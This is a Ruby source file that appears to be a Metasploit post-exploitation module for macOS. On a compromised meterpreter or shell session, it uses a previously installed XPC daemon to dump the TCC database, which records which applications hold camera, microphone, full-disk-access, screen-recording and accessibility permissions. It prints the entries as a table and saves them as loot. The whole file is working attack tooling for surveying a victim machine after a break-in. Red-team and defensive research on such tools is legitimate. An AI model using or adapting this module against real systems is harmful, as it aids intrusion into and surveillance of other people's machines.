##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC TCC Database Dump',
        'Description'  => %q{
          Dumps the macOS Transparency, Consent, and Control (TCC) database via the
          XPC daemon. The TCC database tracks which applications have been granted
          permissions for protected resources such as camera, microphone, full disk
          access, screen recording, and accessibility. Stored as loot.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell']
      )
    )
  end

  def run
    unless xpc_client_exists?
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return
    end

    print_status("Dumping TCC database via XPC daemon...")
    data = xpc_exec!('t2')
    return if data.nil?

    if data.is_a?(Array)
      tbl = Rex::Text::Table.new(
        'Header'  => 'TCC Permissions',
        'Indent'  => 2,
        'Columns' => ['Service', 'Client', 'Auth Value', 'Auth Reason']
      )
      data.each do |entry|
        tbl << [
          entry['service']     || '',
          entry['client']      || '',
          entry['auth_value']  || '',
          entry['auth_reason'] || ''
        ]
      end
      print_line(tbl.to_s)
    elsif data.is_a?(Hash)
      xpc_print_table('TCC Permissions', data)
    else
      print_line(data.to_s)
    end

    loot_path = xpc_store_loot(
      'tcc_dump',
      data.to_json,
      'tcc_dump.json',
      'macOS TCC database dump via XPC'
    )
    print_good("TCC database saved to #{loot_path}")
  end
end
